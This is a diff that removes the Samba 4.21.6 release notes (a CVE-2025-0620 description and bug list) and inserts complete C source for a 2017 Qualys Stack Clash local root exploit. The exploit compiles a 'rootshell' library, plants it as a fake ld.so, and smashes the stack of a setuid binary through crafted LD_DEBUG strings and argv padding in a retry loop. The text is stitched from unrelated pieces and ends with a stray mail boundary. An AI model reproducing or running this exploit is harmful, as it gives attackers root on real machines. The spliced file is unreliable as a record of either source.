+ * Copyright (C) 2017 Qualys, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ */
 
-Description of CVE-2025-0620
------------------------------
+/**
+cat > rootshell.c << "EOF"
+#define _GNU_SOURCE
+#include <linux/capability.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+#define die() exit(__LINE__)
+static void __attribute__ ((constructor)) status(void) {
+    if (dup2(STDIN_FILENO, STDOUT_FILENO) != STDOUT_FILENO) die();
+    if (dup2(STDIN_FILENO, STDERR_FILENO) != STDERR_FILENO) die();
+    const pid_t pid = getpid();
+    if (pid <= 0) die();
+    printf("Pid:\t%zu\n", (size_t)pid);
+    uid_t ruid, euid, suid;
+    gid_t rgid, egid, sgid;
+    if (getresuid(&ruid, &euid, &suid)) die();
+    if (getresgid(&rgid, &egid, &sgid)) die();
+    printf("Uid:\t%zu\t%zu\t%zu\n", (size_t)ruid, (size_t)euid, (size_t)suid);
+    printf("Gid:\t%zu\t%zu\t%zu\n", (size_t)rgid, (size_t)egid, (size_t)sgid);
+    static struct __user_cap_header_struct header;
+    if (capget(&header, NULL)) die();
+    if (header.version <= 0) die();
+    header.pid = pid;
+    static struct __user_cap_data_struct data[2];
+    if (capget(&header, data)) die();
+    printf("CapInh:\t%08x%08x\n", data[1].inheritable, data[0].inheritable);
+    printf("CapPrm:\t%08x%08x\n", data[1].permitted, data[0].permitted);
+    printf("CapEff:\t%08x%08x\n", data[1].effective, data[0].effective);
+    fflush(stdout);
+    for (;;) sleep(10);
+    die();
+}
+EOF
+gcc -fpic -shared -nostartfiles -Os -s -o rootshell rootshell.c
+xxd -i rootshell > rootshell.h
+**/
 
-     With Kerberos authentication SMB sessions typically have an
-     associated lifetime, requiring re-authentication by the
-     client when the session expires. As part of the
-     re-authentication, Samba receives the current group
-     membership information and is expected to reflect this
-     change in further SMB request processing.
+#define _GNU_SOURCE
+#include <elf.h>
+#include <fcntl.h>
+#include <link.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <sys/stat.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
-     For historic reasons, Samba maintains a cache of
-     associations between a user's impersonation information and
-     connected shares. A recent change in this cache caused Samba
-     to not reflect group membership changes from session
-     re-authentication when processing further SMB requests.
+#define mempset(_s, _c, _n) (memset((_s), (_c), (_n)) + (_n))
 
-     As a result, when an administrator removes a user from a
-     particular group in Active Directory, this change will not
-     become effective unless the user disconnects from the server
-     and establishes a new connection.
+#define PAGESZ ((size_t)4096)
+#define STACK_ALIGN ((size_t)16)
+#define SUB_STACK_RAND ((size_t)8192)
+#define SAFE_STACK_SIZE ((size_t)24<<10)
+#define MAX_ARG_STRLEN ((size_t)128<<10)
 
+#define INIT_STACK_EXP (131072UL)
+#define STACK_GUARD_GAP (1UL<<20)
+#define MIN_GAP (128*1024*1024UL + (((-1UL) & 0x3fffff) << 12))
 
-Changes since 4.21.5
---------------------
+#define LDSO "/lib64/ld-linux-x86-64.so.2"
+#define LDSO_OFFSET ((size_t)0x238)
 
-o  Douglas Bagnall <douglas.bagnall@catalyst.net.nz>
-    * BUG 15774: Running "gpo manage motd set" twice fails with backtrace.
-    * BUG 15829: samba-tool gpo backup creates entity backups it can't read.
-    * BUG 15839: gp_cert_auto_enroll_ext.py has problem unpacking GUIDs with
-      prepended 0's.
+#define die() do { \
+    printf("died in %s: %u\n", __func__, __LINE__); \
+    exit(EXIT_FAILURE); \
+} while (0)
 
-o  Ralph Boehme <slow@samba.org>
-    * BUG 15707: CVE-2025-0620 [SECURITY] smbd doesn't pick up group membership
-      changes when re-authenticating an expired SMB session.
-    * BUG 15767: Deadlock between two smbd processes.
+static const ElfW(auxv_t) * my_auxv;
 
-o  Pavel Filipenský <pfilipensky@samba.org>
-    * BUG 15727: net ad join fails with "Failed to join domain: failed to create
-      kerberos keytab".
+static unsigned long int
+my_getauxval (const unsigned long int type)
+{
+    const ElfW(auxv_t) * p;
 
-o  Andreas Hasenack <andreas.hasenack@canonical.com>
-    * BUG 15774: Running "gpo manage motd set" twice fails with backtrace.
+    if (!my_auxv) die();
+    for (p = my_auxv; p->a_type != AT_NULL; p++)
+        if (p->a_type == type)
+            return p->a_un.a_val;
+    die();
+}
 
-o  Volker Lendecke <vl@samba.org>
-    * BUG 15841: Wide link issue in samba 4.22.
+struct elf_info {
+    uintptr_t rx_start, rx_end;
+    uintptr_t rw_start, rw_end;
+    uintptr_t dynamic_start;
+    uintptr_t data_start;
+};
 
-o  Stefan Metzmacher <metze@samba.org>
-    * BUG 15767: Deadlock between two smbd processes.
-    * BUG 15851: dcerpcd not able to bind to listening port.
+static struct elf_info
+get_elf_info(const char * const binary)
+{
+    struct elf_info elf;
+    memset(&elf, 0, sizeof(elf));
 
-o  Anoop C S <anoopcs@samba.org>
-    * BUG 15819: vfs_ceph_snapshots fails to list snapshots for entries at any
-      level beyond share root.
+    const int fd = open(binary, O_RDONLY);
+    if (fd <= -1) die();
+    struct stat st;
+    if (fstat(fd, &st)) die();
+    if (!S_ISREG(st.st_mode)) die();
+    if (st.st_size <= 0) die();
+    #define SAFESZ ((size_t)64<<20)
+    if (st.st_size >= (ssize_t)SAFESZ) die();
+    const size_t size = st.st_size;
+    uint8_t * const buf = malloc(size);
+    if (!buf) die();
+    if (read(fd, buf, size) != (ssize_t)size) die();
+    if (close(fd)) die();
 
-o  Martin Schwenke <mschwenke@ddn.com>
-    * BUG 15858: CTDB does not put nodes running NFS into grace on graceful
-      shutdown.
+    if (size <= LDSO_OFFSET + sizeof(LDSO)) die();
+    if (memcmp(buf + LDSO_OFFSET, LDSO, sizeof(LDSO))) die();
 
+    if (size <= sizeof(ElfW(Ehdr))) die();
+    const ElfW(Ehdr) * const ehdr = (const ElfW(Ehdr) *)buf;
+    if (ehdr->e_ident[EI_MAG0] != ELFMAG0) die();
+    if (ehdr->e_ident[EI_MAG1] != ELFMAG1) die();
+    if (ehdr->e_ident[EI_MAG2] != ELFMAG2) die();
+    if (ehdr->e_ident[EI_MAG3] != ELFMAG3) die();
+    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) die();
+    if (ehdr->e_ident[EI_DATA] != ELFDATA2LSB) die();
+    if (ehdr->e_type != ET_DYN) die();
+    if (ehdr->e_machine != EM_X86_64) die();
+    if (ehdr->e_version != EV_CURRENT) die();
+    if (ehdr->e_ehsize != sizeof(ElfW(Ehdr))) die();
+    if (ehdr->e_phentsize != sizeof(ElfW(Phdr))) die();
+    if (ehdr->e_phoff <= 0 || ehdr->e_phoff >= size) die();
+    if (ehdr->e_phnum > (size - ehdr->e_phoff) / sizeof(ElfW(Phdr))) die();
 
-#######################################
-Reporting bugs & Development Discussion
-#######################################
+    unsigned int i;
+    for (i = 0; i < ehdr->e_phnum; i++) {
+        const ElfW(Phdr) * const phdr = (const ElfW(Phdr) *)(buf + ehdr->e_phoff) + i;
+        if (phdr->p_type != PT_LOAD) continue;
+        if (phdr->p_offset >= size) die();
+        if (phdr->p_filesz > size - phdr->p_offset) die();
+        if (phdr->p_filesz > phdr->p_memsz) die();
+        if (phdr->p_vaddr != phdr->p_paddr) die();
+        if (phdr->p_vaddr >= SAFESZ) die();
+        if (phdr->p_memsz >= SAFESZ) die();
+        if (phdr->p_memsz <= 0) die();
+        if (phdr->p_align != 2 * STACK_GUARD_GAP) die();
 
-Please discuss this release on the samba-technical mailing list or by
-joining the #samba-technical:matrix.org matrix room, or
-#samba-technical IRC channel on irc.libera.chat.
+        const uintptr_t start = phdr->p_vaddr & ~(PAGESZ-1);
+        const uintptr_t end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
+        if (elf.rw_end) die();
 
-If you do report problems then please try to send high quality
-feedback. If you don't provide vital information to help us track down
-the problem then you will probably be ignored.  All bug reports should
-be filed under the Samba 4.1 and newer product in the project's Bugzilla
-database (https://bugzilla.samba.org/).
+        switch (phdr->p_flags) {
+            case PF_R | PF_X:
+                if (elf.rx_end) die();
+                if (phdr->p_vaddr) die();
+                elf.rx_start = start;
+                elf.rx_end = end;
+                break;
+            case PF_R | PF_W:
+                if (!elf.rx_end) die();
+                if (start <= elf.rx_end) die();
+                elf.rw_start = start;
+                elf.rw_end = end;
+                break;
+            default:
+                die();
+        }
+    }
+    if (!elf.rx_end) die();
+    if (!elf.rw_end) die();
 
+    uintptr_t _dynamic = 0;
+    uintptr_t _data = 0;
+    uintptr_t _bss = 0;
 
-======================================================================
-== Our Code, Our Bugs, Our Responsibility.
-== The Samba Team
-======================================================================
+    for (i = 0; i < ehdr->e_shnum; i++) {
+        const ElfW(Shdr) * const shdr = (const ElfW(Shdr) *)(buf + ehdr->e_shoff) + i;
+        if (!(shdr->sh_flags & SHF_ALLOC)) continue;
+        if (shdr->sh_addr <= 0 || shdr->sh_addr >= SAFESZ) die();
+        if (shdr->sh_size <= 0 || shdr->sh_size >= SAFESZ) die();
+        #undef SAFESZ
+        const uintptr_t start = shdr->sh_addr;
+        const uintptr_t end = start + shdr->sh_size;
 
+        if (!(shdr->sh_flags & SHF_WRITE)) {
+            if (start < elf.rw_end && end > elf.rw_start) die();
+            continue;
+        }
+        if (start < elf.rw_start || end > elf.rw_end) die();
+        if (_bss) die();
 
+        switch (shdr->sh_type) {
+            case SHT_PROGBITS:
+                if (start <= _data) die();
+                _data = start;
+                break;
+            case SHT_NOBITS:
+                if (!_data) die();
+                _bss = start;
+                break;
+            case SHT_DYNAMIC:
+                if (shdr->sh_entsize != sizeof(ElfW(Dyn))) die();
+                if (_dynamic) die();
+                _dynamic = start;
+                /* fall through */
+            default:
+                _data = 0;
+                break;
+        }
+    }
+    elf.dynamic_start = _dynamic;
+    elf.data_start = _data;
+    if (!_dynamic) die();
+    if (!_data) die();
+    if (!_bss) die();
+    free(buf);
+    return elf;
+}
 
-================
-Download Details
-================
+int
+main(const int my_argc, const char * const my_argv[], const char * const my_envp[])
+{
+  {
+    const char * const * p = my_envp;
+    while (*p++) ;
+    my_auxv = (const void *)p;
+  }
+    if (my_getauxval(AT_PAGESZ) != PAGESZ) die();
+  {
+    const char * const platform = (const void *)my_getauxval(AT_PLATFORM);
+    if (!platform) die();
+    if (strcmp(platform, "x86_64")) die();
+  }
+    if (my_argc != 2) {
+        printf("Usage: %s binary\n", my_argv[0]);
+        die();
+    }
+    const char * const binary = realpath(my_argv[1], NULL);
+    if (!binary) die();
+    if (*binary != '/') die();
+    if (access(binary, R_OK | X_OK)) die();
+    const struct elf_info elf = get_elf_info(binary);
+    if (elf.rx_start) die();
 
-The uncompressed tarballs and patch files have been signed
-using GnuPG (ID AA99442FB680B620).  The source code can be downloaded
-from:
+    if (sizeof(ElfW(Dyn)) != STACK_ALIGN) die();
+    if (elf.dynamic_start % STACK_ALIGN != STACK_ALIGN / 2) die();
 
-         https://download.samba.org/pub/samba/stable/
+    const uintptr_t arg_start = elf.rx_end + 2 * STACK_GUARD_GAP + INIT_STACK_EXP + PAGESZ-1;
+    if (arg_start >= elf.rw_end) die();
 
-The release notes are available online at:
+    const size_t argv_size = (arg_start - elf.data_start) - (SAFE_STACK_SIZE + 8*8+22*2*8+16+4*STACK_ALIGN + SUB_STACK_RAND);
+    printf("argv_size %zu\n", argv_size);
+    if (argv_size >= arg_start) die();
 
-         https://www.samba.org/samba/history/samba-4.21.6.html
+    const size_t arg0_size = elf.rw_end - arg_start;
+    if (arg0_size % PAGESZ != 1) die();
 
-Our Code, Our Bugs, Our Responsibility.
-(https://bugzilla.samba.org/)
+    const size_t npads = argv_size / sizeof(char *);
+    if (npads <= arg0_size) die();
 
-                         --Enjoy
-                         The Samba Team
+    const size_t smash_size = (elf.data_start - elf.rw_start) + SAFE_STACK_SIZE + SUB_STACK_RAND;
+    if (smash_size >= (elf.rw_start - elf.rx_end) - STACK_GUARD_GAP) die();
+    if (smash_size + 1024 >= MAX_ARG_STRLEN) die();
+    printf("smash_size %zu\n", smash_size);
 
+    const size_t hi_smash_size = (SAFE_STACK_SIZE * 3 / 4) & ~(STACK_ALIGN-1);
+    printf("hi_smash_size %zu\n", hi_smash_size);
+    if (hi_smash_size <= STACK_ALIGN) die();
+    if (hi_smash_size >= smash_size) die();
 
+    const size_t lo_smash_size = (smash_size - hi_smash_size) & ~(STACK_ALIGN-1);
+    printf("lo_smash_size %zu\n", lo_smash_size);
+    if (lo_smash_size <= STACK_ALIGN) die();
 
+    #define LD_DEBUG_ "LD_DEBUG="
+    static char foreground[MAX_ARG_STRLEN];
+  {
+    char * cp = stpcpy(foreground, LD_DEBUG_);
+    cp = mempset(cp, 'A', hi_smash_size - 16);
+    cp = mempset(cp, ' ', 1);
+    cp = mempset(cp, 'A', 24);
+    cp = mempset(cp, ' ', 1);
+    cp = mempset(cp, 'A', 1);
+    cp = mempset(cp, ' ', DT_SYMTAB + 16 - (24+1 + 1 + DT_NEEDED) % 16);
+    cp = mempset(cp, 'A', 80);
+    cp = mempset(cp, ' ', 16);
+    cp = mempset(cp, 'A', 31);
+    cp = mempset(cp, ' ', 1);
+    cp = mempset(cp, 'A', 1);
+    cp = mempset(cp, ' ', DT_NEEDED + 16 - (31+1 + 1 + DT_STRTAB) % 16);
+    cp = mempset(cp, 'A', 80);
+    cp = mempset(cp, ' ', 16);
+    cp = mempset(cp, 'A', 31);
+    cp = mempset(cp, ' ', 1);
+    cp = mempset(cp, 'A', 1);
+    cp = mempset(cp, ' ', DT_STRTAB + 16 - (31+1 + 1 + 1 + strlen(binary)+1 + sizeof(void *)) % 16);
+    cp = mempset(cp, 'A', lo_smash_size - 16);
+    if (cp >= foreground + sizeof(foreground)) die();
+    if (cp <= foreground) die();
+    if (*cp) die();
+    if (strlen(foreground) != (size_t)(cp - foreground)) die();
+  }
+    static char background[MAX_ARG_STRLEN];
+  {
+    char * cp = stpcpy(background, LD_DEBUG_);
+    cp = mempset(cp, 'L', lo_smash_size);
+    size_t i;
+    for (i = 0; i < (32 + 48 + 96) / sizeof(uint64_t); i++) {
+        const uint64_t strtab = 0x8888888888888888UL + 0;
+        cp = mempcpy(cp, &strtab, sizeof(uint64_t));
+    }
+    for (i = 0; i < (32 + 48 + 96) / sizeof(uint64_t); i++) {
+        const uint64_t needed = 0x7777777777777778UL + LDSO_OFFSET+1;
+        cp = mempcpy(cp, &needed, sizeof(uint64_t));
+    }
+    cp = mempset(cp, 'H', 32 + 48 + hi_smash_size - 16);
+    if (cp >= background + sizeof(background)) die();
+    if (cp <= background) die();
+    if (*cp) die();
+    if (strlen(background) != (size_t)(cp - background)) die();
+    if (strlen(background) != strcspn(background, " ,:")) die();
+  }
+
+    static char pad[MAX_ARG_STRLEN];
+    memset(pad, ' ', sizeof(pad)-1);
+    if (pad[sizeof(pad)-1]) die();
+    if (strlen(pad) != sizeof(pad)-1) die();
+    if (sizeof(pad) % STACK_ALIGN) die();
+  {
+    double probability = npads * sizeof(pad) - (128<<20);
+    probability *= probability / 2;
+    probability /= (16UL<<30);
+    probability /= ( 1UL<<40);
+    printf("probability 1/%zu\n", (size_t)(1 / probability));
+  }
+
+    static char arg0[MAX_ARG_STRLEN];
+    if (arg0_size >= sizeof(arg0)) die();
+    if (arg0_size <= 0) die();
+    memset(arg0, ' ', arg0_size-1);
+    static char arg2[MAX_ARG_STRLEN];
+
+    const size_t nargs = 3 + npads - (arg0_size-1);
+    char ** const argv = calloc(nargs + 1, sizeof(char *));
+    if (!argv) die();
+  {
+    char ** ap = argv;
+    *ap++ = arg0;
+    *ap++ = "--help";
+    *ap++ = arg2;
+    size_t n;
+    for (n = ap - argv; n < nargs; n++) {
+        *ap++ = pad;
+    }
+    if (ap != argv + nargs) die();
+    if (*ap) die();
+  }
+
+    const size_t nenvs = 2 + arg0_size-1;
+    char ** const envp = calloc(nenvs + 1, sizeof(char *));
+    if (!envp) die();
+  {
+    char ** ep = envp;
+    *ep++ = background;
+    *ep++ = foreground;
+    size_t n;
+    for (n = ep - envp; n < nenvs; n++) {
+        *ep++ = pad;
+    }
+    if (ep != envp + nenvs) die();
+    if (*ep) die();
+  }
+
+  {
+    size_t len = strlen(binary)+1 + sizeof(void *);
+    char * const * const __strpp[] = { argv, envp, NULL };
+    char * const * const * strpp;
+    for (strpp = __strpp; *strpp; strpp++) {
+        char * const * strp;
+        for (strp = *strpp; *strp; strp++) {
+            len += strlen(*strp) + 1;
+        }
+    }
+    len = 1 + PAGESZ - len % PAGESZ;
+    memset(arg2, ' ', len);
+  }
+
+  {
+    if (npads * sizeof(pad) + (1<<20) >= MIN_GAP / 4) die();
+    const struct rlimit rlimit_stack = { MIN_GAP, MIN_GAP };
+    if (setrlimit(RLIMIT_STACK, &rlimit_stack)) die();
+  }
+    const int dev_null = open("/dev/null", O_WRONLY);
+    if (dev_null <= -1) die();
+
+  {
+    static char ldso[] = "." LDSO;
+    char * const slash = strrchr(ldso, '/');
+    if (!slash) die();
+    *slash = '\0';
+    mkdir(ldso, 0755);
+    *slash = '/';
+
+    const int fd = open(ldso, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0755);
+    if (fd <= -1) die();
+    static const
+    #include "rootshell.h"
+    if (write(fd, rootshell, rootshell_len) != (ssize_t)rootshell_len) die();
+    if (close(fd)) die();
+  }
+
+    size_t try;
+    for (try = 1; try; try++) {
+        if (fflush(stdout)) die();
+        const pid_t pid = fork();
+        if (pid <= -1) die();
+        if (pid == 0) {
+            if (dup2(dev_null, STDOUT_FILENO) != STDOUT_FILENO) die();
+            if (dup2(dev_null, STDERR_FILENO) != STDERR_FILENO) die();
+            if (dev_null > STDERR_FILENO) if (close(dev_null)) die();
+            execve(binary, argv, envp);
+            die();
+        }
+        int status = 0;
+        struct timeval start, stop, diff;
+        if (gettimeofday(&start, NULL)) die();
+        if (waitpid(pid, &status, WUNTRACED) != pid) die();
+        if (gettimeofday(&stop, NULL)) die();
+        timersub(&stop, &start, &diff);
+        printf("try %zu %ld.%06ld ", try, diff.tv_sec, diff.tv_usec);
+
+        if (WIFSIGNALED(status)) {
+            printf("signal %d\n", WTERMSIG(status));
+            switch (WTERMSIG(status)) {
+                case SIGKILL:
+                case SIGSEGV:
+                case SIGBUS:
+                    break;
+                default:
+                    die();
+            }
+        } else if (WIFEXITED(status)) {
+            printf("exited %d\n", WEXITSTATUS(status));
+        } else if (WIFSTOPPED(status)) {
+            printf("stopped %d\n", WSTOPSIG(status));
+            die();
+        } else {
+            printf("unknown %d\n", status);
+            die();
+        }
+    }
+    die();
+}
+
+--gBBFr7Ir9EOA20Yy--
